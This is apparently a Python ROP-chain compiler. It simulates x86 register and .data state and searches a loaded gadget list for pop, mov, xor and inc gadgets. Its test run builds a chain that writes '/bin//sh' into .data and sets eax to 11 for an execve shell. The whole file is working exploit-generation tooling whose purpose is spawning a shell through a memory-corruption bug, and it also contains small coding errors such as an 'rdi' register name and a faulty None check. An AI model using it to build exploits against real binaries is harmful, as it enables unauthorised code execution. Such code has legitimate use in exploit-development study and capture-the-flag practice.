import copy
from struct import pack
import re

ACC_NAME = "eax"
COUNT_NAME = "ecx"
DATA_NAME = "edx"
BASE_NAME = "ebx"
SPOINT_NAME = "esp"
SBASE_NAME = "ebp"
SOURCE_NAME = "esi"
DEST_NAME = "rdi"
registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

class SysState:
    acc = None
    count = None
    data = None
    base = None
    spoint = None
    sbase = None
    source = None
    dest = None
    datavalues = b''

    popped = []

    def __init__(self):
        print("Creating New SysState Object...")

    def printSystem(self):
        print(ACC_NAME + " : " + str(self.acc))
        print(COUNT_NAME + " : " + str(self.count))
        print(DATA_NAME + " : " + str(self.data))
        print(BASE_NAME + " : " + str(self.base))
        print(SPOINT_NAME + " : " + str(self.spoint))
        print(SBASE_NAME + " : " + str(self.sbase))
        print(SOURCE_NAME + " : " + str(self.source))
        print(DEST_NAME + " : " + str(self.dest))
        print("dat" + " : " + str(self.datavalues))

    def allRegisters(self):
        return [self.acc, self.count, self.data, self.base, self.spoint, self.sbase, self.source, self.dest]

def argsToData(args):
    data = b''
    data += "/bin".encode("utf-8")
    data += "//sh".encode("utf-8")
    return data

def getFromLoc(state, name):
    if name == ACC_NAME:
        return state.acc
    if name == COUNT_NAME:
        return state.count
    if name == DATA_NAME:
        return state.data
    if name == BASE_NAME:
        return state.base
    if name == SPOINT_NAME:
        return state.spoint
    if name == SBASE_NAME:
        return state.sbase
    if name == SOURCE_NAME:
        return state.source
    if name == DEST_NAME:
        return state.dest
    if name[0:11] == "dword ptr [":
        return getFromLoc(state, name[12:15])
    #TODO add support for .data

def generalToBytes(value):
    if type(value) is bytes:
        return value
    if type(value) is int:
        return pack("<I", value)
    if value is None:
        return pack("<I", 0)

def writeToData(state, position, value):
    numBytes = len(value)
    pos = int(position.lstrip("@ .dat+") or 0)
    state.datavalues = state.datavalues[:pos] + value + state.datavalues[pos + numBytes:]
    return

def setToLoc(state, name, value):
    print("set " + name + " to " + str(value))
    if name == ACC_NAME:
        state.acc = value
    if name == COUNT_NAME:
        state.count = value
    if name == DATA_NAME:
        state.data = value
    if name == BASE_NAME:
        state.base = value
    if name == SPOINT_NAME:
        state.spoint = value
    if name == SBASE_NAME:
        state.sbase = value
    if name == SOURCE_NAME:
        state.source = value
    if name == DEST_NAME:
        state.dest = value
    if name[0:7] == "@ .data":
        writeToData(state, name, value)
    if name[0:11] == "dword ptr [":
        setToLoc(state, getFromLoc(state, name[11:14]), value)

def inc(state, r):
    #increment value in r
    setToLoc(state, r, pack("<I", int.from_bytes(getFromLoc(state, r), "little") + 1))

def xor(state, d, s):
    #xor d with s and store in d
    if d == s:
        setToLoc(state, d, b'\x00\x00\x00\x00')
        return
    v1 = generalToBytes(getFromLoc(state, d))
    v2 = generalToBytes(getFromLoc(state, s))
    v = bytes(a ^ b for a, b in zip(v1, v2))
    setToLoc(state, d, v)

def mov(state, d, s):
    #get value from s and store in d
    setToLoc(state, d, getFromLoc(state, s))

def pop(state, r):
    #pop register r
    state.popped.append(r)

def endpop(state, v):
    #set popped register to v then unpop register
    setToLoc(state, state.popped[0], v)
    state.popped.pop(0)

def transition(state, instruction):
    print(instruction)
    if type(instruction) is bytes:
        endpop(state, instruction)
        return state
    
    retless = instruction
    if retless[-6:] == " ; ret":
        retless = retless[:-6]
    insts = [x.strip() for x in retless.split(";")]
    for i in insts[:-1]:
        transition(state, i)
    parts = [x.strip() for x in insts[-1].split(",")]
    command = parts[0]
    if len(parts) == 2:
        operand = parts[1]
    if command[0:3] == "inc":
        inc(state, command[4:])
    if command[0:3] == "xor":
        xor(state, command[4:], operand)
    if command[0:3] == "mov":
        mov(state, command[4:], operand)
    if command[0:3] == "pop":
        pop(state, command[4:])
    if command[0:1] == "@":
        endpop(state, command)
    if command[0:3] == "nop":
        return state
    return state

def run(state, shellcode):
    print("running:")
    print(shellcode)
    for instruction in shellcode:
        transition(state, instruction)

def addRet(gadget):
    return gadget.rstrip().append(" ; ret")

def removeRet(gadget):
    if gadget[-5:] == "; ret":
        return gadget[:-5]
    return gadget

def createGoal(shellcode):
    goal = SysState()
    run(goal, shellcode)
    return goal

def getWriterRegisters(gadget):
    dest = gadget[15:18]
    source = gadget[21:24]
    return dest, source

def writeExecutionSearch(startstate, endstate, Gadgets):
    execution = []
    success = False

    #Find all writing gadgets
    writers = [x for x in Gadgets if ((x[:15] == "mov dword ptr [") and (x[15:18] in registers) and (x[18] == "]") and x[24:] == " ; ret")]
    #print([x for x in Gadgets if (re.match("mov dword ptr \[[a-z]{3}\] ; ret", x) is not None)])
    print("writing gadgets:")
    print(writers)

    #Get Location to write to
    writeLocation = ".data"
    print("write location:")
    if len(startstate.datavalues) != 0:
        writeLocation += " + " + str(len(startstate.datavalues))
    print(writeLocation)

    #Get data to write
    writeData = endstate.datavalues[-4:]
    print(writeData)

    #Attempt to find executions which set registers for each write gadget
    for w in writers:
        locationreg, valuereg = getWriterRegisters(w)
        setGoal = copy.deepcopy(startstate)
        setToLoc(setGoal, locationreg, "@ " + writeLocation)
        setToLoc(setGoal, valuereg, writeData)
        print("Searching for write using: " + w)
        setexec = setExecutionSearch(startstate, setGoal, Gadgets)
        if len(setexec) > 0:
            success = True
            execution = setexec
            execution.append(w)
            print("Found write using " + w)
            break

    #Add execution which sets registers to desired endstate
    #TODO
    
    if success == False:
        return []
    return execution

def popcontrol(Gadgets):
    control = [""] * len(registers)
    #print(Gadgets)
    search = "|".join(Gadgets)
    for i, r in enumerate(registers):
        s = re.search("(pop [a-z]{3} ; )*(pop "+r+" ; )(pop [a-z]{3} ; )*ret", search)
        if type(s) is not None:
            control[i] = s.group()
    return control

def movcontrol(Gadgets):
    control = [""] * len(registers)
    for i, r in enumerate(registers):
        if("mov " + r + ", eax ; ret") in Gadgets:
            control[i] = "eax"
        if("mov " + r + ", ebx ; ret") in Gadgets:
            control[i] = "ebx"
        if("mov " + r + ", ecx ; ret") in Gadgets:
            control[i] = "ecx"
        if("mov " + r + ", edx ; ret") in Gadgets:
            control[i] = "edx"
    return control

def xorcontrol(Gadgets):
    control = [False] * len(registers)
    for i, r in enumerate(registers):
        if ("xor " + r + ", " + r + " ; ret" in Gadgets) and ("inc " + r + " ; ret" in Gadgets):
            print("xor control of " + r)
            control[i] = True
    return control

def setExecutionSearch(startstate, endstate, Gadgets):
    print("setExecutionSearch")
    success = False
    execution = []

    movreqs = movcontrol(Gadgets)
    popcontrolled = popcontrol(Gadgets)
    xorcontrolled = xorcontrol(Gadgets)
    registersToSet = [x != y for x, y in zip(startstate.allRegisters(), endstate.allRegisters())]

    print(registersToSet)
    print(popcontrolled)
    if [(x == False or y != "") for x, y in zip(registersToSet, popcontrolled)] == [True] * len(registersToSet):
        print(registersToSet)
        for i, r in enumerate(registers):
            if registersToSet[i] == True:
                pops = [x[-4:-1] for x in removeRet(popcontrolled[i]).split(";")]
                pops.reverse()
                values = []
                null = False
                for reg in pops:
                    values.append(getFromLoc(endstate, reg))
                    if type(values[-1]) == bytes and b'\x00' in values[-1]:
                        null = True
                if null:
                    continue                
                for reg in pops:
                    print(reg)
                    print(getFromLoc(endstate, reg))
                    execution.append(getFromLoc(endstate, reg))
                execution.append(popcontrolled[i])
                registersToSet[i] = False

    print(xorcontrolled)
    print(registersToSet)
    for i in range(len(registersToSet)):
        if registersToSet[i] == True and xorcontrolled[i] == True:
            print("xorcontrol")
            print(registers[i])
            print(getFromLoc(endstate, registers[i]))
            execution.extend([("inc " + registers[i] + " ; ret")] * int.from_bytes(getFromLoc(endstate, registers[i]), byteorder="little"))
            execution.append("xor " + registers[i] + ", " + registers[i] + " ; ret")
            registersToSet[i] = False
    print(execution)
    for i in range(len(registersToSet)):
        if registersToSet[i] == True:
            print("movreqs")
            print(movreqs[i])
            
    if registersToSet == [False] * len(registersToSet):
        success = True


    execution.reverse()
    print(execution)
    if success == False:
        return []
    return execution

def findExecution(startstate, endstate, Gadgets):
    startstate.printSystem()
    if startstate.datavalues != endstate.datavalues:
        return writeExecutionSearch(startstate, endstate, Gadgets)
    return setExecutionSearch(startstate, endstate, Gadgets)


#shellcode should be a list of assembly instructions as strings
#gadgets should be a list of gadgets that will be available as strings
def create(shellcode, gadgets):
    retgadgets = [x for x in gadgets if x[-3:] == "ret"]
    allowedgadgets = [x for x in retgadgets if x.count(';') < 3]

    #Generate Goal State
    Goal = createGoal(shellcode)
    Goal.printSystem()

    #Initialise Simulation
    GadgetSequence = []
    System = SysState()
    SubGoal = SysState()

    #Reverse Execution from goal
    execution = []

    #Load to .data
    while Goal.datavalues != System.datavalues:
        SubGoal = copy.deepcopy(System)
        SubGoal.datavalues = Goal.datavalues[:len(System.datavalues)+4]
        section = findExecution(System, SubGoal, allowedgadgets)
        if len(section) == 0:
            print("Failed to write to data")
            quit()
        else:
            print("Added data write")
        System.printSystem()
        execution.extend(section)
        print(section)
        run(System, section)
        System.printSystem()
        
    #Load register values
    regload = findExecution(System, Goal, allowedgadgets)
    print("regload:")
    print(regload)
    execution.extend(regload)
    TestSystem = SysState()
    run(TestSystem, execution)
    TestSystem.printSystem()
    print(execution)
    #Return Sequence of Gadgets
    return execution

if __name__ == "__main__":
    #gadgets = ["pop edx ; ret", "pop eax ; ret", "mov dword ptr [edx], eax ; ret", "xor eax, eax ; ret", "pop ebx ; ret", "pop ecx ; ret"]

    import ROPcompile
    dictionary = {}
    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
    gadgets = dictionary.keys()

    print("CREATE TEST")
    create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, gadgets)
